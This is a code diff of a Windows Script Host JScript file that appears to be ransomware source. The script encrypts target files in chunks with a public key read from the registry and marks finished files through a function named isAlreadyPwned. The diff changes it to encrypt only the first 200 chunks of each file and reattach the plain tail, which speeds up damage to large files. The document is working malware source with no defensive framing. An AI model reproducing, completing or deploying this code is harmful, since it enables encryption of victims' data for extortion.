@@ -11,8 +11,10 @@ var chunkHeaderSeperator = '*';
 var chunkSeperator = '$';
 var minimumChunkSize = 936;
 var publicKeyHiveEntry = 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\pk';
+var maxNoOfChunks = 200;
 //End of other config
 var charLen =  (minimumChunkSize) / 8;
+var numberOfCharactersToRead = maxNoOfChunks * charLen;
 
 var ForReading = 1;
 var ForWriting = 2;
@@ -36,24 +38,47 @@ function buildChunkHeader(text) {
 function buildMainHeader(text) {
 	return text.length + mainHeaderSeperator + text;
 };
-function readFile(path) {
+function readOnlyHead(path) {
 	var fileObj = fso.GetFile(path);
 	var ts = fileObj.OpenAsTextStream(ForReading);
 	var fileBody = '';
+	var readChars = 0;
 	while(!ts.AtEndOfStream) {
-		fileBody+=ts.read(1);
+		var readChar = ts.read(1);
+		if(readChars < numberOfCharactersToRead) {
+			fileBody += readChar;
+		} else {
+			break;
+		}
+		readChars++;
+	}
+	ts.Close();
+	return fileBody;
+};
+function readOnlyEnd(path) {
+	var fileObj = fso.GetFile(path);
+	var ts = fileObj.OpenAsTextStream(ForReading);
+	var fileBody = '';
+	var readChars = 0;
+	while(!ts.AtEndOfStream) {
+		var readChar = ts.read(1);
+		if(readChars > numberOfCharactersToRead - 1) {
+			fileBody += readChar;
+		}
+		readChars++;
 	}
 	ts.Close();
 	return fileBody;
 };
 function writeFile(path, content) {
+	var tailEnd = readOnlyEnd(path);
 	var fileObj = fso.GetFile(path);
 	var ts = fileObj.OpenAsTextStream(ForWriting);
-	ts.write(content);
+	ts.write(content+tailEnd);
 	ts.close();
 };
 function encryptFileSection() {
-  var extractedText = readFile(fileNameToEncrypt);
+  var extractedText = readOnlyHead(fileNameToEncrypt);
 
 	var stringChunks = [];
 	for(var i = charLen; i < extractedText.length; i += charLen) { 
@@ -70,7 +95,6 @@ function isAlreadyPwned() {
   var start = f.Read(completedFileIndicator.length);
   return completedFileIndicator == start;
 };
-
 function replaceFile() {
 	try{
 		if(isAlreadyPwned() == false) {
